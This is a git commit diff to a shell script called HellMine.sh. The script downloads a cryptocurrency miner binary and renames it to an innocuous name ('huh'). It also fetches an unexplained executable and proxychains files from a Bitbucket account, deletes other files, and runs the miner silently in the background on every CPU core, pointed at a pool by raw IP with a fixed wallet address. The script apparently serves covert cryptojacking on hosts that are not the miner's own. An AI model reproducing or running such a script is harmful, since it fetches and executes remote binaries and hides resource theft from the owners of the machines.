005788c2abf9ba2a76eb4794a30a01568a11e1aa
HellDarkK <86185393+SankuNetwork@users.noreply.github.com>
2023-08-12 06:51:05 +0700

    Update HellMine.sh

--- mnr/cpunlimited/HellMine.sh
+++ mnr/cpunlimited/HellMine.sh
@@ -1,8 +1,8 @@
-wget -O hmm.tar.gz https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz && tar -xf hmm.tar.gz && mv hellminer hm
+wget -O hmm.tar.gz https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz && tar -xf hmm.tar.gz && mv hellminer huh
 wget -q -O proxy https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x proxy
 wget https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so
 wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
 echo "IP ORI ==> "$(curl ifconfig.me)
 echo "IP Baru ==> "$(curl ifconfig.me)
 rm -rf sh.sh config_*
-./hm -u RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq -c stratum+ssl://verushash.mine.zergpool.com:13300 -p c=VRSC,id=YANTO$(( $RANDOM % 1000 + 1 )) --cpu -1 &> /dev/null &
+./huh -u RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq.worker$(( $RANDOM % 1000 + 1 )) -c stratum+ssl://139.99.123.225:3958 -p x --cpu $(nproc) &> /dev/null &
